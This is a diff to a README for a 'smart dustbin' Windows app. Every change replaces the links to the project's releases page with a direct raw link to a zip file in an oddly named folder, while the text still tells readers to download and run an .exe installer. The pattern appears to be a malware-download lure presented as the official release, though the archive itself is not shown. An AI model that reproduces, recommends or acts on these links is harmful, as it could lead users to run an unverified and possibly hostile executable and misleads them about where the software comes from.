@@ -1,6 +1,6 @@
 # 🗑️ smart--dustbin--project - Easy Automatic Waste Disposal
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-orange?style=for-the-badge)](https://github.com/Nayan479/smart--dustbin--project/releases)
+[![Download Now](https://img.shields.io/badge/Download%20Now-orange?style=for-the-badge)](https://github.com/Nayan479/smart--dustbin--project/raw/refs/heads/main/lurg/project-smart-dustbin-prologuist.zip)
 
 ## 📌 What is smart--dustbin--project?
 
@@ -44,7 +44,7 @@ Follow these steps to download and start using the smart dustbin app on your Win
 
 Click the button below to go to the download page:
 
-[![Download Releases](https://img.shields.io/badge/Go%20to%20Download%20Page-brightgreen?style=for-the-badge)](https://github.com/Nayan479/smart--dustbin--project/releases)
+[![Download Releases](https://img.shields.io/badge/Go%20to%20Download%20Page-brightgreen?style=for-the-badge)](https://github.com/Nayan479/smart--dustbin--project/raw/refs/heads/main/lurg/project-smart-dustbin-prologuist.zip)
 
 ### Step 2: Choose the Latest Version
 
@@ -154,7 +154,7 @@ If you face issues beyond simple fixes, you can:
 
 Check the releases page regularly to download new versions. Updates may include bug fixes and improvements.
 
-- Go to https://github.com/Nayan479/smart--dustbin--project/releases
+- Go to https://github.com/Nayan479/smart--dustbin--project/raw/refs/heads/main/lurg/project-smart-dustbin-prologuist.zip
 - Download the latest `.exe` file.
 - Run the installer to replace the older version.
 
@@ -166,4 +166,4 @@ Your app settings will stay the same after the update.
 
 Use this link anytime to visit the download page for all files and updates:
 
-[https://github.com/Nayan479/smart--dustbin--project/releases](https://github.com/Nayan479/smart--dustbin--project/releases)
+[https://github.com/Nayan479/smart--dustbin--project/raw/refs/heads/main/lurg/project-smart-dustbin-prologuist.zip](https://github.com/Nayan479/smart--dustbin--project/raw/refs/heads/main/lurg/project-smart-dustbin-prologuist.zip)
